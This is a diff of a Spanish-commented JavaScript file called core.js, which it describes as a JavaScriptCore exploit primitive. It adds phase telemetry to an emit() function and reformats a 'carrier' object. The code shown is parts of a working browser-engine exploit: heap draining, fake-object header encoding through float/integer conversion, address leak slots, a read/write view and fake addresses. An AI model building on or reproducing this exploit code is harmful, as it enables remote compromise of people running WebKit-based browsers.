@@ -1,14 +1,9 @@
-// core.js — primitiva JSC. Mejoras:
-//  - GC forzado en cada intento y en fallo.
-//  - Delays aumentados.
-//  - Verificación de identidad extendida a 16 bytes.
-//  - Reintento único de la promoción a par real en mem.js (fuera de este archivo).
-//  - Emisión de eventos de fase para telemetría.
+// core.js — primitiva JSC. Se añade telemetría al emit() sin tocar lógica.
 
 let DRAIN_COUNT = 512;
-const AUTO_RETRY_DELAY_MS = 120;      // +40 ms vs 80
-const CAPTURE_DELAY_MS = 120;         // +40 ms
-const COMPOSE_DELAY_MS = 200;         // +50 ms
+const AUTO_RETRY_DELAY_MS = 120;
+const CAPTURE_DELAY_MS = 120;
+const COMPOSE_DELAY_MS = 200;
 
 const K = 2;
 const DUPLICATE_INDEX = 2;
@@ -188,7 +183,6 @@ function resetProfile() {
 
 function hex(value) { return `0x${value.toString(16)}`; }
 function buffer(size) { return new ArrayBuffer(size); }
-
 function allZero(bytes, start, end) {
     for (let i = start; i < end; ++i) if (bytes[i] !== 0) return false;
     return true;
@@ -251,7 +245,29 @@ function encodedHeaderNumber() {
     u32[0] = 0x00004250; u32[1] = 0x01062800;
     return f64[0];
 }
+
+// ============================================================
+// emit() con telemetría añadida. Lógica intacta.
+// ============================================================
 function emit(tag, detail) {
+    try {
+        if (window.__TM) {
+            if (!window.__TM.stages[tag]) {
+                window.__TM.stages[tag] = {
+                    count: 0, first: null, last: null, samples: []
+                };
+            }
+            const s = window.__TM.stages[tag];
+            s.count++;
+            const now = Date.now() - window.__TM.startedAt;
+            const text = String(detail == null ? '' : detail).slice(0, 120);
+            if (!s.first) s.first = { ts: now, detail: text };
+            s.last = { ts: now, detail: text };
+            if (s.samples.length < 3) s.samples.push({ ts: now, detail: text });
+            if (window.__TM.render) window.__TM.render();
+        }
+    } catch (e) { /* nunca romper el flujo por telemetría */ }
+
     if (onEvent === null) return;
     try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
     catch {  }
@@ -898,16 +914,13 @@ function buildCarrier() {
         },
         get view() { return rwView; },
         windowBytes: RW_BUFFER_SIZE,
-        holder: targetHolder,
-        holderAddress: targetAddress,
+        holder: targetHolder, holderAddress: targetAddress,
         leakSlotOffset: LEAK_SLOT_OFFSET,
         leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
         setLeakSlot(value) { targetHolder.q2 = value; },
         clearLeakSlot() { targetHolder.q2 = markerObjectA; },
-        anchorObject: markerObjectA,
-        anchorObjectAddress: markerAAddress,
-        textarea: anchorElement,
-        textareaAddress: anchorElementAddress,
+        anchorObject: markerObjectA, anchorObjectAddress: markerAAddress,
+        textarea: anchorElement, textareaAddress: anchorElementAddress,
         profile, attempts: attemptNumber, validate: plausibleAddress,
         hostAddress, fakeAddress,
         assertHome() {
